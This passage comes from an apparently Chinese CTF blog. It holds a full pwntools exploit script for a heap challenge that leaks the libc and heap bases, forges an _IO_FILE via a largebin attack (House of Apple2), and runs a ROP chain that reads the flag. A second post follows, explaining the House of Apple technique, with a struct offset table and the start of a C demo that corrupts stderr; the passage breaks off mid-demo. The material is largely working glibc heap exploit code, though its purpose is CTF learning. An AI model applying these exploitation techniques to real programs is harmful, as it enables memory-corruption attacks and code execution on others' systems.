class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./oneday1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.51.221.20&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1B0A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">i</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">mod</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choise: &quot;</span>,<span class="built_in">str</span>(mod))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: \n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,message</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Message: \n&quot;</span>,message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;enter your key &gt;&gt;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>) </span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>) </span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Message: \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x1810</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1f2cc0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">_IO_list_all = libc_base + libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]</span><br><span class="line">magic_gadget = libc_base + libc.sym[<span class="string">&#x27;svcudp_reply&#x27;</span>] + <span class="number">26</span></span><br><span class="line">success(<span class="string">&quot;_IO_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">success(<span class="string">&quot;magic_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(magic_gadget))</span><br><span class="line"></span><br><span class="line">pop_rax_ret = <span class="number">0x00000000000446c0</span> + libc_base</span><br><span class="line">pop_rdi_ret = <span class="number">0x000000000002daa2</span> + libc_base</span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000037c0a</span> + libc_base</span><br><span class="line">pop_rdx_rbx_ret = <span class="number">0x0000000000087729</span> + libc_base</span><br><span class="line">syscall_ret = <span class="number">0x00000000000883b6</span> + libc_base</span><br><span class="line">leave_ret = <span class="number">0x0000000000052d72</span> + libc_base</span><br><span class="line">ret = <span class="number">0x000000000002d446</span> + libc_base</span><br><span class="line">add_rsp_ret = <span class="number">0x0000000000103936</span> + libc_base</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>) </span><br><span class="line">add(<span class="number">2</span>) </span><br><span class="line">add(<span class="number">1</span>) </span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>) </span><br><span class="line">add(<span class="number">1</span>) </span><br><span class="line">add(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">fake_io_addr = heap_base + <span class="number">0x22d0</span></span><br><span class="line">flag_addr = heap_base + <span class="number">0x2540</span></span><br><span class="line">shellcode_addr = heap_base + <span class="number">0x2540</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;./flag&quot;</span>.ljust(<span class="number">0x8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">shellcode += p64(add_rsp_ret)</span><br><span class="line">shellcode =  shellcode.ljust(<span class="number">0x18</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">shellcode += p64(shellcode_addr)</span><br><span class="line">shellcode =  shellcode.ljust(<span class="number">0x28</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">shellcode += p64(leave_ret)</span><br><span class="line">shellcode += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line"><span class="comment"># open(heap_addr,0)</span></span><br><span class="line">shellcode += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">shellcode += p64(pop_rdi_ret) + p64(flag_addr)</span><br><span class="line">shellcode += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">shellcode += p64(pop_rdx_rbx_ret) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">shellcode += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(3,heap_addr,0x60)</span></span><br><span class="line">shellcode += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">shellcode += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">shellcode += p64(pop_rsi_ret) + p64(flag_addr+<span class="number">0x300</span>)</span><br><span class="line">shellcode += p64(pop_rdx_rbx_ret) + p64(<span class="number">0x60</span>) + p64(<span class="number">0</span>)</span><br><span class="line">shellcode += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1,heap_addr,0x60)</span></span><br><span class="line">shellcode += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">shellcode += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">shellcode += p64(pop_rsi_ret) + p64(flag_addr+<span class="number">0x300</span>)</span><br><span class="line">shellcode += p64(pop_rdx_rbx_ret) + p64(<span class="number">0x60</span>) + p64(<span class="number">0</span>)</span><br><span class="line">shellcode += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">chunkA = <span class="string">&quot;chunka&quot;</span> <span class="comment"># fake_io_addr+0xe0</span></span><br><span class="line">chunkA =  chunkA.ljust(<span class="number">0xe0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">chunkA += p64(fake_io_addr+<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">chunkB = <span class="string">&quot;chunkb&quot;</span> <span class="comment"># fake_io_addr+0x200</span></span><br><span class="line">chunkB = chunkB.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">chunkB += p64(magic_gadget)</span><br><span class="line"></span><br><span class="line">fake_IO_FILE =  p64(<span class="number">0</span>)    <span class="comment">#_flags=0</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xab1</span>-<span class="number">0x30</span>) </span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x48</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(shellcode_addr)</span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x1f5720</span>)  <span class="comment"># _lock</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0xe0</span>)<span class="comment"># _wide_data</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps)  <span class="comment"># vtable=IO_wfile_jumps</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xe0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += chunkA</span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x200</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += chunkB</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(heap_base)+p64(_IO_list_all-<span class="number">0x20</span>)</span><br><span class="line">payload += fake_IO_FILE</span><br><span class="line">payload += shellcode</span><br><span class="line">payload = payload.ljust(<span class="number">10</span>*<span class="number">0x110</span>-<span class="number">0x10</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xab1</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">choice(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>本题目我花了很长的时间，从堆风水的搭建，到 <code>_IO_FILE</code> 的伪造，再到控制程序流，这些步骤都不好完成</p>
<p>但 House Of Apple2 的确很好用，常常需要 <code>libc.sym[&#39;svcudp_reply&#39;]+26</code> 来劫持控制流</p>
<p>而 House Of Apple 则可以利用一次 largebin attack 来同时写入多个已知数据</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/08/House%20Of%20Apple-%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/08/House%20Of%20Apple-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Apple-原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-08 23:41:08" itemprop="dateCreated datePublished" datetime="2022-11-08T23:41:08+08:00">2022-11-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-11-10 02:28:59" itemprop="dateModified" datetime="2022-11-10T02:28:59+08:00">2022-11-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Apple"><a href="#House-Of-Apple" class="headerlink" title="House Of Apple"></a>House Of Apple</h2><p>House Of Apple 可以在仅使用一次 largebin attack 并限制读写次数的条件下进行 FSOP 利用</p>
<p>此方法利用成功的前提是已经泄露出 <code>libc_base</code> 地址和 <code>heap_base</code> 地址 </p>
<hr>
<h2 id="House-Of-Apple-原理"><a href="#House-Of-Apple-原理" class="headerlink" title="House Of Apple 原理"></a>House Of Apple 原理</h2><p>当程序从 <code>main</code> 函数返回或者执行 <code>exit</code> 函数的时候，均会调用 <code>fcloseall</code> 函数，该调用链为： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span> -&gt; fcloseall -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_wstrn_overflow</span><br></pre></td></tr></table></figure>
<ul>
<li>最后会遍历 <code>_IO_list_all</code> 存放的每一个 <code>IO_FILE</code> 结构体</li>
<li>如果满足条件的话，会调用每个结构体中 <code>vtable-&gt;_overflow</code> 函数指针指向的函数</li>
</ul>
<p>使用 largebin attack 可以劫持 <code>_IO_list_all</code> 变量，将其替换为伪造的 <code>IO_FILE</code> 结构体，而在此时，我们其实仍可以继续利用某些IO流函数去修改其他地方的值</p>
<p>要想修改其他地方的值，就离不开 <code>_IO_FILE</code> 的一个成员 <code>_wide_data</code> 的利用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">amd64：</span><br><span class="line"></span><br><span class="line"><span class="number">0x0</span>:<span class="string">&#x27;_flags&#x27;</span>,</span><br><span class="line"><span class="number">0x8</span>:<span class="string">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class="line"><span class="number">0x10</span>:<span class="string">&#x27;_IO_read_end&#x27;</span>,</span><br><span class="line"><span class="number">0x18</span>:<span class="string">&#x27;_IO_read_base&#x27;</span>,</span><br><span class="line"><span class="number">0x20</span>:<span class="string">&#x27;_IO_write_base&#x27;</span>,</span><br><span class="line"><span class="number">0x28</span>:<span class="string">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class="line"><span class="number">0x30</span>:<span class="string">&#x27;_IO_write_end&#x27;</span>,</span><br><span class="line"><span class="number">0x38</span>:<span class="string">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class="line"><span class="number">0x40</span>:<span class="string">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class="line"><span class="number">0x48</span>:<span class="string">&#x27;_IO_save_base&#x27;</span>,</span><br><span class="line"><span class="number">0x50</span>:<span class="string">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class="line"><span class="number">0x58</span>:<span class="string">&#x27;_IO_save_end&#x27;</span>,</span><br><span class="line"><span class="number">0x60</span>:<span class="string">&#x27;_markers&#x27;</span>,</span><br><span class="line"><span class="number">0x68</span>:<span class="string">&#x27;_chain&#x27;</span>,</span><br><span class="line"><span class="number">0x70</span>:<span class="string">&#x27;_fileno&#x27;</span>,</span><br><span class="line"><span class="number">0x74</span>:<span class="string">&#x27;_flags2&#x27;</span>,</span><br><span class="line"><span class="number">0x78</span>:<span class="string">&#x27;_old_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x80</span>:<span class="string">&#x27;_cur_column&#x27;</span>,</span><br><span class="line"><span class="number">0x82</span>:<span class="string">&#x27;_vtable_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x83</span>:<span class="string">&#x27;_shortbuf&#x27;</span>,</span><br><span class="line"><span class="number">0x88</span>:<span class="string">&#x27;_lock&#x27;</span>,</span><br><span class="line"><span class="number">0x90</span>:<span class="string">&#x27;_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x98</span>:<span class="string">&#x27;_codecvt&#x27;</span>,</span><br><span class="line"><span class="number">0xa0</span>:<span class="string">&#x27;_wide_data&#x27;</span>,</span><br><span class="line"><span class="number">0xa8</span>:<span class="string">&#x27;_freeres_list&#x27;</span>,</span><br><span class="line"><span class="number">0xb0</span>:<span class="string">&#x27;_freeres_buf&#x27;</span>,</span><br><span class="line"><span class="number">0xb8</span>:<span class="string">&#x27;__pad5&#x27;</span>,</span><br><span class="line"><span class="number">0xc0</span>:<span class="string">&#x27;_mode&#x27;</span>,</span><br><span class="line"><span class="number">0xc4</span>:<span class="string">&#x27;_unused2&#x27;</span>,</span><br><span class="line"><span class="number">0xd8</span>:<span class="string">&#x27;vtable&#x27;</span></span><br></pre></td></tr></table></figure>
<p>我们在伪造 <code>_IO_FILE</code> 结构体的时候，伪造 <code>_wide_data</code> 变量，然后通过某些函数，比如 <code>_IO_wstrn_overflow</code> 就可以将已知地址空间上的某些值修改为一个已知值</p>
<h2 id="House-Of-Apple-利用姿势"><a href="#House-Of-Apple-利用姿势" class="headerlink" title="House Of Apple 利用姿势"></a>House Of Apple 利用姿势</h2><p>使用 house of apple 的条件为：</p>
<ul>
<li>程序从 <code>main</code> 函数返回或能调用 <code>exit</code> 函数</li>
<li>能泄露出 <code>libc_base</code> 地址和 <code>heap_base</code> 地址 </li>
<li>能使用一次 largebin attack（一次即可） </li>
</ul>
<p>先利用 largebin attack 劫持 <code>_IO_list_all</code>，然后伪造一个 <code>stderr IO_FILE</code>：</p>
<ul>
<li>stderr+0x28 = -1（stderr-&gt;_IO_write_ptr）</li>
<li>stderr+0x74 = 8（stderr-&gt;_flags2）</li>
<li>stderr+0xa0 = target（stderr-&gt;_wide_data）</li>
<li>stderr+0xd8 == _IO_wstrn_jumps（stderr-&gt;vtable）</li>
</ul>
<p>最后调用 exit 完成修改（因为 <code>stderr IO_FILE</code> 被伪造，因此程序不会真的退出）</p>
<p>使用案例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate a 0x100 chunk&quot;</span>);</span><br><span class="line">    <span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    <span class="keyword">size_t</span> *tmp = p1;</span><br><span class="line">    <span class="keyword">size_t</span> old_value = <span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p1[i] = old_value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> puts_addr = (<span class="keyword">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="keyword">void</span> *)puts_addr);</span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">stderr</span> = puts_addr + <span class="number">0x1691a0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> stderr_write_ptr_addr = <span class="built_in">stderr</span> + <span class="number">0x28</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_IO_write_ptr address: %p\n&quot;</span>, (<span class="keyword">void</span> *)stderr_write_ptr_addr);</span><br><span class="line">    <span class="keyword">size_t</span> stderr_flags2_addr = <span class="built_in">stderr</span> + <span class="number">0x74</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_flags2 address: %p\n&quot;</span>, (<span class="keyword">void</span> *)stderr_flags2_addr);</span><br><span class="line">    <span class="keyword">size_t</span> stderr_wide_data_addr = <span class="built_in">stderr</span> + <span class="number">0xa0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_wide_data address: %p\n&quot;</span>, (<span class="keyword">void</span> *)stderr_wide_data_addr);</span><br><span class="line">    <span class="keyword">size_t</span> sdterr_vtable_addr = <span class="built_in">stderr</span> + <span class="number">0xd8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;vtable address: %p\n&quot;</span>, (<span class="keyword">void</span> *)sdterr_vtable_addr);</span><br><span class="line">    <span class="keyword">size_t</span> _IO_wstrn_jumps_addr = <span class="built_in">stderr</span> - <span class="number">0x4960</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="keyword">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_IO_write_ptr to -1&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)stderr_write_ptr_addr = (<span class="keyword">size_t</span>)<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_flags2 to 8&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)stderr_flags2_addr = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)stderr_wide_data_addr = (<span class="keyword">size_t</span>)p1;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)sdterr_vtable_addr = (<span 